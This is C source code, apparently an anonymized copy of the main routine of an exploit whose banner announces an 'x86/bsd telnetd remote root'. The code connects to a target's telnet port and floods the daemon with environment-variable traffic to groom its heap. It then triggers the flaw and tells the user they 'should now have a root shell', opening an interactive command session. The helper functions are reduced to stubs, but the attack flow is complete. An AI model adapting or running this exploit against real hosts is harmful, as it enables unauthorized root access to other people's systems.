
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct timeval {unsigned long tv_sec; } ;


 int VAR_0 ;
 char VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (int ) ;
 int VAR_4 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int ) ;
 int FUNC_3 (int ) ;
 scalar_t__ VAR_5 ;
 int FUNC_4 (int ,char*) ;
 int FUNC_5 () ;
 char FUNC_6 (int,char**,char*) ;
 int FUNC_7 (struct timeval*,int *) ;
 int VAR_6 ;
 int FUNC_8 (int *,char*,int,int) ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 () ;
 int FUNC_11 (int) ;
 int FUNC_12 (int) ;
 int VAR_10 ;
 int VAR_11 ;
 int FUNC_13 (char*) ;
 int VAR_12 ;
 int FUNC_14 (int) ;
 scalar_t__ FUNC_15 (int) ;
 int FUNC_16 (int) ;

int
FUNC_17 (int VAR_13, char *VAR_14[])
{
        char VAR_15;
        char * VAR_16;
        char * VAR_17;
        int VAR_18, VAR_19, VAR_20,
                                VAR_21 = 0;
        int VAR_22;
        struct timeval VAR_23,
                                VAR_24;
        unsigned long long int VAR_25,
                                VAR_26;


        FUNC_4 (VAR_10, "7350854 - x86/bsd telnetd remote root\n"
                "by zip, lorian, smiler and scut.\n\n");

        VAR_16 = VAR_14[0];
        if (VAR_13 < 2)
                FUNC_13 (VAR_16);


        while ((VAR_15 = FUNC_6 (VAR_13, VAR_14, "n:cf")) != VAR_1) {
                switch (VAR_15) {
                case 'n':
                        VAR_7 = FUNC_0 (VAR_8);
                        break;
                case 'c':
                        VAR_4 = 1;
                        break;
                case 'f':
                        VAR_5 = 1;
                        break;
                default:
                        FUNC_13 (VAR_16);
                        break;
                }
        }

        VAR_17 = VAR_14[VAR_13 - 1];
        if (VAR_17[0] == '-')
                FUNC_13 (VAR_16);

        VAR_20 = FUNC_8 (((void*)0), VAR_17, 23, 20);
        if (VAR_20 <= 0) {
                FUNC_4 (VAR_10, "failed to connect\n");
                FUNC_2 (VAR_2);
        }

        FUNC_10 ();

        if (FUNC_15 (VAR_20) == 0 && VAR_5 == 0) {
                FUNC_9 ("aborting\n");

                FUNC_2 (VAR_2);

        }
        FUNC_1 (VAR_20);

        if (VAR_4)
                FUNC_2 (VAR_3);

        VAR_20 = FUNC_8 (((void*)0), VAR_17, 23, 20);
        if (VAR_20 <= 0) {
                FUNC_4 (VAR_10, "failed to connect the second time\n");
                FUNC_2 (VAR_2);
        }

        FUNC_9 ("\n#############################################################################\n\n");
        FUNC_9 ("ok baby, times are rough, we send %dmb traffic to the remote\n"
                "telnet daemon process, it will spill badly. but then, there is no\n"
                "other way, sorry...\n\n", VAR_6);




        FUNC_9 ("## setting populators to populate heap address space\n");

        VAR_26 = ((unsigned long long int)(VAR_9 / 2)) *
                        ((unsigned long long int)(VAR_9 + 1));
        VAR_25 = 0;

        FUNC_9 ("## number of setenvs (dots / network): %d\n", VAR_9);
        FUNC_9 ("## number of walks (percentage / cpu): %Lu\n", VAR_26);
        FUNC_9 ("##\n");
        FUNC_9 ("## the percentage is more realistic than the dots ;)\n");
        FUNC_9 ("\n");
        FUNC_9 ("percent |");

        VAR_22 = VAR_9 / VAR_0;
        for (VAR_18 = VAR_9 / VAR_22 ; VAR_18 >= 0 ; --VAR_18)
                FUNC_9 ("-");
        FUNC_9 ("|      ETA |\n");

        FUNC_7 (&VAR_23, ((void*)0));

        for (VAR_12 = 0 ; VAR_12 < VAR_9 ; ++VAR_12) {
                FUNC_16 (VAR_20);

                VAR_25 += VAR_12;

                if (VAR_12 % VAR_22 == 0)
                        VAR_21 += 1;

                if (VAR_12 % 200 == 0) {
                        int VAR_27;
                        float VAR_28;
                        unsigned long int VAR_29;

                        VAR_27 = (int) ((VAR_25 * 100) / VAR_26);
                        VAR_28 = VAR_25 * 100;
                        VAR_28 /= (float) VAR_26;


                        FUNC_7 (&VAR_24, ((void*)0));
                        VAR_29 = VAR_24.tv_sec - VAR_23.tv_sec;

                        FUNC_9 ((VAR_27 == 100) ? "\r%3.2f%% |" : ((VAR_27 / 10) ?
                                "\r %2.2f%% |" : "\r  %1.2f%% |"), VAR_28);
                        for (VAR_19 = 0 ; VAR_19 < VAR_21 ; ++VAR_19)
                                FUNC_9 (".");
                        for ( ; VAR_19 <= VAR_0 ; ++VAR_19)
                                FUNC_9 (" ");

                        if (VAR_27 != 0) {
                                VAR_29 = (int) ((((float)(100 - VAR_28)) /
                                        (float) VAR_28) * VAR_29);
                                FUNC_9 ("| %02lu:%02lu:%02lu |",
                                        VAR_29 / 3600, (VAR_29 % 3600) / 60,
                                        VAR_29 % 60);
                        } else {
                                FUNC_9 ("| --:--:-- |");
                        }

                        FUNC_3 (VAR_11);
                }
        }
        FUNC_9 ("\n\n");

        FUNC_9 ("## sleeping for 10 seconds to let the process recover\n");
        FUNC_12 (10);





        FUNC_14 (VAR_20);
        FUNC_12 (1);

        FUNC_9 ("## ok, you should now have a root shell\n");
        FUNC_9 ("## as always, after hard times, there is a reward...\n");
        FUNC_9 ("\n\ncommand: ");
        FUNC_3 (VAR_11);

        FUNC_11 (VAR_20);

        FUNC_2 (VAR_3);
}
